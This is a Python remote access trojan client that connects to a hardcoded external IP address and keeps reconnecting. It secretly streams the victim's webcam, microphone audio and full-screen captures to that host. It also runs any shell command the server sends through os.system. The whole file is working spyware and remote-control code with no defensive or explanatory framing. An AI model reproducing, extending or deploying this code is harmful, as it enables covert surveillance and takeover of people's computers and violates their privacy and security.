import tkinter as tk
import pyaudio
import socket
import pickle
import struct
import numpy
import time
import cv2
import io
import os

from threading import Thread
from PIL import ImageGrab

host = "186.204.228.130"
port = 4000
root = tk.Tk()
cap = cv2.VideoCapture(0)

audio = pyaudio.PyAudio()
stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)   

class Client:
    def __init__(self):
        self.connectClient()

    def connectClient(self):
        while True:
            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.connect((host,port))
                self.modeState = self.receiveAll().decode()
                self.screen_size = [root.winfo_screenwidth(), root.winfo_screenheight()]

                self.frame = None
                self.audio = None
                self.stream_cam_enabled = False
                self.frameDump = None
                self.framePack = None
                self.frame = None
                self.close_thread = False

                self.cam_thread = Thread(target=self.streamCam, args=())
                self.micro_thread = Thread(target=self.packMicro, args=())
                self.screen_thread = Thread(target=self.packScreen, args=())

                self.cam_thread.start()
                self.micro_thread.start()
                self.screen_thread.start()

                self.processData()

                break
            except Exception as err:
                time.sleep(2)
                continue
    
    def sendAll(self, data):
        try:
            self.client.sendall(data)
        except:
            self.close_thread = True 
            return None

    def receiveAll(self):
        try:
            data = self.client.recv(1024)
            return data
        except:
            self.close_thread = True
            return None

    def packMicro(self):
        while True:
            if not self.stream_cam_enabled:
                continue
            
            if self.close_thread:
                break

            data = stream.read(1024)
            mic_buff = numpy.frombuffer(data, dtype=numpy.int16)
            microData = mic_buff.astype(numpy.int16).tobytes()
            packet = [0x02, *microData]
            data = self.sendAll(bytes(packet))
            if data == None:
                continue

    def packCam(self, frame):
        frame_dump = pickle.dumps(frame)
        size = len(frame_dump)
        frame_pack = struct.pack("Q", size)
        frameDump = frame_dump
        framePack = frame_pack
        return frameDump, framePack

    def packScreen(self):
        while True:
            if not self.stream_cam_enabled:
                continue

            if self.close_thread:
                print("Screen stream break")
                break

            img = ImageGrab.grab(bbox=(0, 0, self.screen_size[0], self.screen_size[1]))
            compressed_image = io.BytesIO()
            img.save(compressed_image, format='JPEG', quality=90)

            compressed_image.seek(0)
            img_np = numpy.asarray(bytearray(compressed_image.read()))
            frameDump, framePack = self.packCam(img_np)

            dump_len = len(frameDump)
            len_frame = [dump_len >> 16 & 0xff, dump_len >> 8 & 0xff, dump_len & 0xff]

            self.sendAll(bytes([0x03, len(framePack), *framePack, *len_frame, *frameDump]))
            
        pass

    def comProcess(self):
        try:
            self.data = self.receiveAll().decode()

            print(self.data)

            if self.data != "cmd_packet":
                self.stream_cam_enabled = True
                os.system(self.data)
            else:
                self.comProcess()
        except:
            self.connectClient()

    def processData(self):
        while True:
            if self.close_thread:
                self.connectClient()
                break

            try:
                data = self.receiveAll().decode()
            except:
                continue

            if data == None:
                continue

            if data == "cmd_packet":
                self.stream_cam_enabled = False
                self.comProcess()
            else:
                self.stream_cam_enabled = True

    def streamCam(self):
        while True:
            if not self.stream_cam_enabled:
                continue

            if self.close_thread:
                break

            img, frames = cap.read()   

            frameDump, framePack = self.packCam(frames)

            dump_len = len(frameDump)
            len_frame = [dump_len >> 16 & 0xff, dump_len >> 8 & 0xff, dump_len & 0xff]

            self.sendAll(bytes([0x01, len(framePack), *framePack, *len_frame, *frameDump]))

Client()